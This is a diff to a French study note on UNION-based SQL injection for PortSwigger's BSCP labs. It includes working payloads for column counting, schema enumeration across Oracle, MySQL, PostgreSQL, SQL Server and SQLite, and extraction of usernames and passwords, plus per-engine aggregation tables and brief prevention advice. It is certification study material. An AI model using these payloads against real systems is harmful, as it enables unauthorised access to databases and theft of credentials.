@@ -1,8 +1,5 @@
 ---
-tags:
-  - bscp
-  - server-side
-  - sql-injection
+tags: [bscp, server-side, sql-injection]
 niveau: practitioner
 statut: à faire
 ---
@@ -14,16 +11,18 @@ statut: à faire
 - Il permet d'exécuter une ou plusieurs requêtes `SELECT` supplémentaires et d'ajouter leurs résultats à ceux de la requête d'origine.
 - Exemple : `SELECT a, b FROM table1 UNION SELECT c, d FROM table2`.
 - Cette requête renvoie un seul jeu de résultats à deux colonnes, contenant les valeurs de `a` et `b` (table1) et celles de `c` et `d` (table2).
+- La requête d'origine peut renvoyer une ou plusieurs lignes. `UNION` s'évalue après le `WHERE` d'origine : les lignes injectées s'ajoutent à son résultat.
+- Les types doivent être compatibles colonne par colonne. Certains moteurs convertissent implicitement (MySQL est plutôt permissif), d'autres sont stricts (Oracle). `NULL` s'adapte à tous les types.
 
 ## Types et variantes
 - `UNION` supprime les doublons du jeu de résultats, `UNION ALL` les conserve. Les deux fonctionnent pour l'attaque, avec les mêmes contraintes (même nombre de colonnes, types compatibles).
-- Le point d'injection peut être une chaîne entre guillemets (il faut alors fermer le guillemet avec `'`) ou une valeur numérique (pas de guillemet à fermer). Les charges utiles de cette note supposent une chaîne entre guillemets dans la clause `WHERE`.
-- La syntaxe varie selon la base de données (voir plus bas) : Oracle, MySQL, Microsoft SQL Server, PostgreSQL.
+- Le point d'injection peut être une chaîne entre guillemets (il faut alors fermer le guillemet avec `'`) ou une valeur numérique (pas de guillemet à fermer). Sauf mention contraire, les charges utiles de cette note supposent une chaîne entre guillemets dans la clause `WHERE`. Exemple en contexte numérique : `1 UNION SELECT NULL,NULL--`.
+- La syntaxe varie selon la base de données (voir plus bas) : Oracle, MySQL, Microsoft SQL Server, PostgreSQL, SQLite.
 
 ## Comment détecter
-- Envoyer un guillemet simple `'` dans le paramètre : une erreur de base de données ou une réponse anormale indique un point d'injection potentiel.
-- Confirmer avec une charge utile qui modifie la logique de la requête, par exemple `' OR 1=1--`, puis passer à la détermination du nombre de colonnes.
-- Condition indispensable pour l'attaque UNION : le résultat de la requête doit être affiché dans la réponse. Si ce n'est pas le cas, il faut une autre technique (injection SQL aveugle).
+- Les tests de détection (apostrophe, booléen, délai) sont décrits dans [[SQL-injection]].
+- La seule question propre à cette note : le résultat de la requête est-il affiché dans la réponse ? Si oui, l'attaque `UNION` convient, en suivant l'ordre : nombre de colonnes, colonnes de texte, extraction.
+- Si le résultat n'est pas affiché, ou si le mot `UNION` est filtré, passer à l'injection par erreurs ([[Error-based SQL Injection]]) ou aveugle ([[Blind-SQL-injection]]).
 
 ## Comment exploiter (principe)
 - L'attaque exige deux conditions :
@@ -34,7 +33,7 @@ statut: à faire
 	- Quelles colonnes renvoyées par la requête d'origine ont un type de données adapté pour contenir les résultats de la requête injectée.
 
 ### Détermination du nombre de colonnes requises (méthode `ORDER BY`)
-- Lors d'une injection SQL UNION, il existe deux méthodes efficaces pour trouver le nombre de colonnes de la requête d'origine. Voici la première.
+- Lors d'une injection SQL UNION, il existe deux méthodes efficaces pour trouver le nombre de colonnes de la requête d'origine. La première utilise `ORDER BY`.
 - Principe : injecter une série de clauses `ORDER BY` en incrémentant l'index de colonne jusqu'à ce qu'une erreur se produise.
 
 **Charges utiles**
@@ -67,7 +66,7 @@ statut: à faire
 	- La base renvoie une ligne supplémentaire dans le jeu de résultats, avec des valeurs nulles dans chaque colonne.
 	- L'effet sur la réponse HTTP dépend du code de l'application.
 		- Cas favorable : du contenu supplémentaire apparaît, par exemple une ligne en plus dans un tableau HTML.
-		- Autre cas : les valeurs nulles déclenchent une autre erreur, comme une `NullPointerException`.
+		- Autre cas : les valeurs nulles déclenchent une autre erreur (par exemple, côté application, une `NullPointerException`).
 		- Pire cas : la réponse ressemble à celle d'un mauvais nombre de `NULL`, ce qui rend la méthode inefficace.
 
 ### Syntaxe propre à chaque base de données
@@ -77,12 +76,7 @@ statut: à faire
 - Les requêtes injectées doivent donc ressembler à : `' UNION SELECT NULL FROM DUAL--`
 
 **MySQL**
-- Les charges utiles décrites utilisent la séquence de commentaire `--` pour neutraliser la fin de la requête d'origine après le point d'injection.
-- Sur MySQL, `--` doit être suivi d'un espace.
-- Alternative : le caractère `#` permet aussi d'indiquer un commentaire.
-
-**Astuce pratique**
-- Dans une URL, l'espace après `--` s'écrit `+` ou `%20`, et `#` doit être encodé en `%23`, sinon il est interprété comme le début du fragment de l'URL et n'est jamais envoyé au serveur.
+- Le commentaire `--` exige un espace final, ou `#` : voir les pièges communs dans [[SQL-injection]].
 
 ### Trouver les colonnes avec un type de données utile
 - Une attaque UNION permet de récupérer les résultats d'une requête injectée.
@@ -115,7 +109,7 @@ statut: à faire
 **Prérequis**
 - Il faut connaître le nom de la table (`users`) et de ses colonnes (`username`, `password`).
 - Sans cette information, il faut deviner les noms des tables et des colonnes.
-- Toutes les bases modernes offrent des moyens d'examiner leur structure et de savoir quelles tables et colonnes elles contiennent (voir « Afficher le contenu de la base de données »).
+- Toutes les bases modernes offrent des moyens d'examiner leur structure (voir la section sur le contenu de la base de données plus bas).
 
 ### Récupérer plusieurs valeurs dans une seule colonne
 - Dans certains cas, la requête d'origine ne renvoie qu'une seule colonne de type chaîne (ou une seule parmi plusieurs).
@@ -134,20 +128,9 @@ statut: à faire
 	- `carlos~montoya`
 
 **Point clé**
-- Chaque base de données utilise une syntaxe différente pour la concaténation.
-- Pour les détails, consulter le cheat sheet de l'injection SQL de PortSwigger.
-
-**Concaténation selon la base** (d'après le cheat sheet de PortSwigger)
-
-| Type de base de données | Syntaxe                                         |
-| ----------------------- | ----------------------------------------------- |
-| Oracle                  | `'foo'\|\|'bar'`                                |
-| PostgreSQL              | `'foo'\|\|'bar'`                                |
-| Microsoft               | `'foo'+'bar'`                                   |
-| MySQL                   | `'foo' 'bar'` (espace) ou `CONCAT('foo','bar')` |
-
-- Piège : dans une URL, `+` est lu comme un espace. Pour concaténer sur Microsoft, il faut envoyer `%2b`.
+- Chaque base de données utilise une syntaxe différente pour la concaténation (tableau maître plus bas, d'après la cheat sheet PortSwigger).
 - Si la requête d'origine a deux colonnes dont une seule accepte du texte, on place `NULL` dans l'autre : `' UNION SELECT NULL,username||'~'||password FROM users--` (syntaxe Oracle et PostgreSQL).
+- Pour récupérer toutes les lignes d'une table dans une seule valeur, on peut aussi agréger (voir la section sur l'extraction de plusieurs lignes).
 
 ### Analyse de la base de données
 - Il est souvent nécessaire de recueillir des informations sur la base de données. Cela peut comprendre :
@@ -192,29 +175,60 @@ statut: à faire
 - Oracle : `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'` (colonnes utiles : `OWNER`, `TABLE_NAME`, `COLUMN_NAME`, `DATA_TYPE`). Oracle stocke les noms non protégés par des guillemets en majuscules : il faut écrire `'USERS'`.
 
 #### Lien avec l'attaque UNION
-- Cela répond au prérequis vu plus haut : connaître les noms de tables et de colonnes avant de lancer `' UNION SELECT username, password FROM users--`.
-- En pratique, via une injection UNION, on cible les colonnes utiles plutôt que `*` pour respecter le nombre de colonnes. Déroulé :
+- On a besoin des noms de tables et de colonnes avant de lancer `' UNION SELECT username, password FROM users--`.
+- En pratique, via une injection UNION, on cible les colonnes utiles plutôt que `*` pour respecter le nombre de colonnes :
 	- Tables, base non Oracle : `' UNION SELECT table_name,NULL FROM information_schema.tables--`
 	- Colonnes, base non Oracle : `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--`
 	- Tables, Oracle : `' UNION SELECT table_name,NULL FROM all_tables--`
 	- Colonnes, Oracle : `' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--`
 	- Données : `' UNION SELECT username, password FROM users--`
-- Dans les labs, les noms de table et de colonnes sont aléatoires (par exemple `users_abcdef`) : il faut obligatoirement passer par cette énumération.
+- Les noms de table et de colonnes peuvent être aléatoires (par exemple `users_abcdef`) : il faut alors passer par cette énumération.
+- Variantes par moteur :
+	- PostgreSQL : filtrer sur le schéma applicatif pour éviter le bruit des tables système : `' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--`. Les tables d'un autre schéma n'apparaissent pas.
+	- SQLite : pas de `information_schema`. `' UNION SELECT sqlite_version(),NULL--`, puis `' UNION SELECT name,sql FROM sqlite_master--` pour les noms de tables et leurs définitions.
+	- Oracle : `' UNION SELECT table_name,NULL FROM user_tables--` ne liste que les tables du schéma courant ; `user_tab_columns` donne les colonnes correspondantes.
+
+### Extraire plusieurs lignes
+Quand la page n'affiche qu'une seule valeur, on agrège toutes les lignes dans une cellule ou on les parcourt une par une. Les exemples supposent une colonne de texte disponible.
+
+| Besoin | Moteur | Payload | Limites |
+|---|---|---|---|
+| Agréger | MySQL | `' UNION SELECT NULL,GROUP_CONCAT(username,0x3a,password) FROM users-- ` | Limite `group_concat_max_len` |
+| Agréger | PostgreSQL | `' UNION SELECT NULL,STRING_AGG(username\|\|':'\|\|password,',') FROM users--` | Longueur d'affichage |
+| Agréger | SQL Server | `' UNION SELECT NULL,STRING_AGG(username+':'+password,',') FROM users--` | SQL Server 2017 et suivants ; `+` à encoder en `%2b` ; sur les versions plus anciennes, `FOR XML PATH('')` |
+| Agréger | Oracle | `' UNION SELECT NULL,LISTAGG(username\|\|':'\|\|password,',') WITHIN GROUP (ORDER BY username) FROM users--` | Longueur maximale d'une chaîne SQL (4000 octets par défaut) |
+| Parcourir | PostgreSQL, MySQL | `' UNION SELECT username,password FROM users LIMIT 1 OFFSET 1-- ` | Dépend d'une page qui affiche la première ligne injectée |
+| Parcourir | SQL Server | `' UNION SELECT username,password FROM users ORDER BY 1 OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY--` | Un `ORDER BY` est requis |
+| Parcourir | Oracle | `' UNION SELECT username,password FROM users OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY--` | Oracle 12c et suivants ; sinon `ROWNUM` |
+| Une seule ligne | SQL Server | `SELECT TOP 1 ...` | Équivalent de `LIMIT 1` |
+
+`UNION ALL` (`' UNION ALL SELECT NULL,NULL--`) conserve la ligne injectée même si elle est identique à une ligne existante.
+
+### Informations courantes par moteur
+| Besoin | Oracle | MySQL | PostgreSQL | SQL Server | SQLite |
+|---|---|---|---|---|---|
+| Concaténation | `'a'\|\|'b'` | `CONCAT('a','b')` ou `'a' 'b'` | `'a'\|\|'b'` | `'a'+'b'` | `'a'\|\|'b'` |
+| Commentaire | `--` | `-- ` ou `#` | `--` | `--` | `--` |
+| Utilisateur et base courants | `user` (avec `FROM DUAL`) | `user()`, `database()` | `current_user`, `current_database()` | `SYSTEM_USER`, `DB_NAME()` | sans objet |
+| Version | `banner` de `v$version` | `@@version` | `version()` | `@@version` | `sqlite_version()` |
+| Liste des tables | `all_tables`, `user_tables` | `information_schema.tables` | `information_schema.tables` | `information_schema.tables` | `sqlite_master` |
 
 ## Pièges et points d'attention BSCP
+Les pièges communs (commentaire MySQL, encodage URL, cookie) sont dans [[SQL-injection]].
 - Déterminer le nombre de colonnes avant tout, puis les colonnes de type chaîne : sauter ces étapes fait échouer l'injection sans message clair.
 - Oracle : `FROM DUAL` obligatoire pour les `SELECT` sans table, noms d'objets en majuscules dans `all_tables` et `all_tab_columns`.
-- MySQL : `-- ` exige l'espace final (en URL `--+`), ou utiliser `#` encodé en `%23`.
 - Encodage URL : `+` vaut espace, donc `%2b` pour l'opérateur de concaténation Microsoft.
 - Une seule colonne de type chaîne : concaténer plusieurs valeurs avec un séparateur.
-- La réponse peut ne pas afficher d'erreur : comparer longueur et contenu des réponses (Burp Repeater) plutôt que chercher un message.
+- La réponse peut ne pas afficher d'erreur : comparer longueur et contenu des réponses (Burp Repeater) plutôt que chercher un message. Un `ORDER BY` qui échoue peut aussi ne produire aucune erreur visible.
 - La requête d'origine peut renvoyer plusieurs lignes : la ligne injectée apparaît en plus, parfois en bas de la liste. Utiliser une catégorie inexistante dans le filtre peut isoler le résultat injecté.
-- Le point d'injection n'est pas toujours dans l'URL (corps de la requête, cookie, en-tête) : la méthode reste la même.
+- Une colonne de texte n'est pas forcément affichée dans la page : tester chaque colonne et vérifier où apparaît la valeur.
+- Un `LIMIT` dans la requête d'origine peut faire disparaître la ligne injectée.
+- Le point d'injection n'est pas toujours dans l'URL (corps, cookie, en-tête), mais la page doit réafficher la donnée : l'attaque `UNION` n'aboutit que si un cookie ou un en-tête injecté est répercuté dans la réponse.
+- Limites : longueur de la valeur affichée, caractères échappés par l'application, filtrage du mot `UNION`, pare-feu applicatif.
+- Hors périmètre ici : requêtes empilées, lecture de fichiers et second ordre sont décrits dans [[SQL-injection]].
 
 ## Prévention
-- Utiliser des requêtes paramétrées (requêtes préparées) pour toute donnée fournie par l'utilisateur, jamais de concaténation de chaînes dans la requête.
-- Appliquer le principe du moindre privilège au compte de la base : pas d'accès à des tables inutiles ni aux vues de schéma sensibles.
-- Ne pas renvoyer les erreurs détaillées de la base à l'utilisateur.
+Voir [[SQL-injection]] (requêtes paramétrées, moindre privilège, erreurs masquées). Point propre à cette attaque : retirer au compte de la base les droits sur `information_schema` et les vues de schéma, pour limiter l'énumération.
 
 ## Labs PortSwigger
 - [x] Apprentice ✅ 2026-10-26
@@ -325,7 +339,8 @@ Pour résoudre cet exercice, connectez-vous en tant qu'utilisateur `administrato
 
 
 ## Liens
-- [[Access-control]]
-- [[Authentication]]
-- [[Using-Burp-Suite]]
+- [[SQL-injection]]
+- [[Blind-SQL-injection]]
+- [[Error-based SQL Injection]]
+- [[Payloads-cheatsheet]]
 - https://portswigger.net/web-security/sql-injection/cheat-sheet
